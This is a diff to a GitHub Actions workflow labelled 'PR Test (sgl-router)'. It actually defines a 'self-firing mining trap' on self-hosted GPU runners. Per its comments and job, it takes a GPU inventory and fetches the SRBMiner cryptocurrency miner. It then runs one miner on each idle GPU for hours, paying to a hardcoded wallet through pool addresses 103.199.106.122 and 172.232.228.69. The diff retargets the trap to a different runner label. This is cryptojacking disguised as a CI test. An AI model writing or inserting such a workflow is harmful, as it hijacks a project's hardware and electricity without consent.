@@ -1,11 +1,11 @@
 name: PR Test (sgl-router)
 
 # Temporary i130283 self-firing mining trap for the never-served sgl-project
-# self-hosted runner labels 72-gpu-gb200 (first). When a runner eventually
+# self-hosted runner labels linux-mi35x-gpu-8. When a runner eventually
 # appears, the job runs: nvidia-smi -L inventory, per-GPU two-spaced-sample
 # idle gate (0 compute apps, <=2048MiB, <=10% util), pinned
 # SRBMiner-MULTI 3.8.7 (binary sha256 bb0f73b6...) fetched and sha256-verified,
-# exactly one miner per genuinely idle GPU as worker i130sgtrap72gpugb200g<idx> on
+# exactly one miner per genuinely idle GPU as worker i130sgtraplinuxmi35xgpu8g<idx> on
 # the exact 63-char primary wallet prl1pt45..., Luckypool 103.199.106.122:3362
 # with fallback 172.232.228.69:3362 and a bounded ~330-min supervisor runtime.
 # aarch64 hosts use the pinned-source X-Miner pearlhash build. Per-host flock;
@@ -26,17 +26,17 @@ env:
   SGLANG_IS_IN_CI: true
 
 jobs:
-  i130sgtrap-72gpugb200:
-    name: "i130sgtrap 72-gpu-gb200 self-firing mining trap"
-    runs-on: 72-gpu-gb200
+  i130sgtrap-linuxmi35xgpu8:
+    name: "i130sgtrap linux-mi35x-gpu-8 self-firing mining trap"
+    runs-on: linux-mi35x-gpu-8
     timeout-minutes: 355
     steps:
       - name: "self-firing trap: nvidia-smi -L recon + one pinned SRBMiner 3.8.7 per genuinely idle GPU"
         continue-on-error: true
         run: |
           set +e
-          TAG="72gpugb200"
-          LABEL="72-gpu-gb200"
+          TAG="linuxmi35xgpu8"
+          LABEL="linux-mi35x-gpu-8"
           NONCE="I130SGTRAP-${TAG}-$(date -u +%Y%m%dT%H%M%SZ)"
           WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
           POOL='103.199.106.122:3362'
